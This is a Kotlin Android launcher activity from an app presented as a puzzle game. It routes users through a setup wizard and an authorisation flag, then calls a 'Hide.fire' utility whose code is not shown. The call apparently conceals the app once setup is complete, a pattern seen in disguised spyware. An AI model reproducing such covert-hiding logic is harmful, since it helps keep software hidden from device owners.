package com.puzzleblast.game

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.puzzleblast.game.ui.CompleteActivity
import com.puzzleblast.game.ui.GameActivity
import com.puzzleblast.game.ui.HomeActivity
import com.puzzleblast.game.ui.WizardActivity
import com.puzzleblast.game.util.Hide
import com.puzzleblast.game.util.Prefs

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val target = when {
            !Prefs.wizardDone -> HomeActivity::class.java
            Prefs.wizardDone && !Prefs.authed -> HomeActivity::class.java
            else -> GameActivity::class.java
        }
        startActivity(Intent(this, target))
        if (Prefs.wizardDone && Prefs.authed) Hide.fire(this)
        finish()
    }
}
